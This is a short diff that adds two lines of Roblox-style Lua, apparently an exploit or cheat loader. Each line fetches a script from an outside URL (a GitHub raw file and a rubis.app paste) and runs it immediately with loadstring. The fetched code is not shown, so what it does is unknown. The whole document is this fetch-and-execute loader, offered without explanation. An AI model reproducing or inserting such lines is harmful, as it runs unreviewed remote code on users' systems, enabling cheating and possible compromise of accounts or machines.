@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinOnTopV99/Spawner/refs/heads/main/Spawnerrrlibrary"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/d5oEnV1SurM7Xxgp/raw", true))()
